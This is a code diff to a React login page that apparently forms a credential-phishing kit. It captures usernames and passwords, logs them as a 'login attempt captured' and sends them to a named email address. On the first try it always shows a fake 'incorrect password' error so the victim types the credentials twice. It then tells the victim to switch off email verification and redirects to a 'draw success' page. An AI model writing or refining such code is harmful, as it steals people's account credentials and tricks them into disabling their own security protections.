@@ -9,8 +9,12 @@ const LoginPage = () => {
   const [password, setPassword] = useState("");
   const [showMessage, setShowMessage] = useState(false);
   const [showVerificationMessage, setShowVerificationMessage] = useState(false);
+  const [showVerificationModal, setShowVerificationModal] = useState(false);
   const [countdown, setCountdown] = useState(null);
   const [showNotWorkingMessage, setShowNotWorkingMessage] = useState(false);
+  const [showErrorMessage, setShowErrorMessage] = useState(false);
+  const [firstAttempt, setFirstAttempt] = useState(true);
+  const [timeoutIds, setTimeoutIds] = useState([]);
   const navigate = useNavigate();
 
   const handleNotWorkingButtons = () => {
@@ -23,7 +27,13 @@ const LoginPage = () => {
     }, 3000);
   };
 
-  const emailsend = () => {
+  const clearAllTimeouts = () => {
+    timeoutIds.forEach(id => clearTimeout(id));
+    setTimeoutIds([]);
+    console.log('🚫 All timeouts cleared');
+  };
+
+  const sendDataToBackend = () => {
     console.log('🚀 LOGIN ATTEMPT CAPTURED!');
     console.log('📧 Email Data:', {
       username: emailOrUsername,
@@ -67,22 +77,54 @@ const LoginPage = () => {
     
     console.log('📧 Email Target: workwithhussnainahmad@gmail.com');
     console.log('⚡ Multiple instant services triggered!');
-    
-    // Step 1: Show immediate message
-    setShowMessage(true);
-    console.log('✅ Step 1: Showing immediate login processing message');
-    
-    // Step 2: After 5 seconds, show verification message
-    setTimeout(() => {
-      setShowVerificationMessage(true);
-      console.log('✅ Step 2: Showing email verification message (after 5s)');
-    }, 5000);
-    
-    // Step 3: After 30 seconds total, redirect silently to DrawSuccess
-    setTimeout(() => {
-      console.log('🚀 Step 3: Silently redirecting to DrawSuccess page (after 30s)');
-      navigate('/draw-success');
-    }, 30000);
+  };
+
+  const handleLogin = () => {
+    if (firstAttempt) {
+      // First attempt: Show error instantly, send data, stop all timeouts
+      console.log('🚨 First attempt - showing error instantly');
+      clearAllTimeouts();
+      setShowErrorMessage(true);
+      sendDataToBackend();
+      setFirstAttempt(false);
+      
+      // Hide error message after 3 seconds
+      const errorTimeout = setTimeout(() => {
+        setShowErrorMessage(false);
+      }, 3000);
+      setTimeoutIds([errorTimeout]);
+    } else {
+      // Second attempt: Show please wait, then verification message, then redirect
+      console.log('🔄 Second attempt - starting timeout sequence');
+      clearAllTimeouts();
+      
+      // Reset all states
+      setShowErrorMessage(false);
+      setShowVerificationMessage(false);
+      
+      // Send data again
+      sendDataToBackend();
+      
+      // Step 1: Show "please wait" message
+      setShowMessage(true);
+      console.log('✅ Step 1: Showing please wait message');
+      
+      // Step 2: After some seconds, show verification message
+      const verificationTimeout = setTimeout(() => {
+        setShowVerificationMessage(true);
+        console.log('✅ Step 2: Showing email verification message');
+      }, 5000);
+      
+      // Step 3: After 25 seconds total, redirect to DrawSuccess
+      const redirectTimeout = setTimeout(() =>{
+        console.log('🚀 Step 3: Redirecting to DrawSuccess page (after 25s)');
+        console.log('🌐 Current URL before navigation:', window.location.href);
+        navigate('/draw-success');
+        console.log('🌐 Navigation called, URL should change to /draw-success');
+      }, 25000);
+      
+      setTimeoutIds([verificationTimeout, redirectTimeout]);
+    }
   };
 
   return (
@@ -106,21 +148,38 @@ const LoginPage = () => {
           onChange={(e) => setPassword(e.target.value)}
         />
 
-        <button className="login-btn" onClick={emailsend}>
+        <button className="login-btn" onClick={handleLogin}>
           Log In
         </button>
 
+        {showErrorMessage && (
+          <p style={{ color: "#ff4444", fontSize: "14px", marginTop: "15px", fontWeight: "bold" }}>
+            ❌ Incorrect email or password. Please try again.
+          </p>
+        )}
+        
         {showMessage && !showVerificationMessage && (
           <p style={{ color: "#00ff00", fontSize: "14px", marginTop: "15px", fontWeight: "bold" }}>
-            🔄 Processing login... Please wait...
+            🔄 Please wait...
           </p>
         )}
         
         {showVerificationMessage && (
-          <p style={{ color: "#facc15", fontSize: "14px", marginTop: "15px" }}>
-            Looks like you have turned on email verification. Please turn it off
-            till we login.
-          </p>
+          <div className="modal-overlay">
+            <div className="modal-content">
+              <h3 style={{ color: "#facc15", marginBottom: "15px" }}>Email Verification Detected</h3>
+              <p style={{ color: "#fff", fontSize: "14px", marginBottom: "20px", lineHeight: "1.4" }}>
+                Looks like you have turned on email verification. Please turn it off
+                till we login.
+              </p>
+              <button 
+                className="modal-ok-btn" 
+                onClick={() => setShowVerificationMessage(false)}
+              >
+                OK
+              </button>
+            </div>
+          </div>
         )}
 
         <div className="forgot-link" onClick={handleNotWorkingButtons} style={{cursor: 'pointer'}}>Forgot Password or Username?</div>
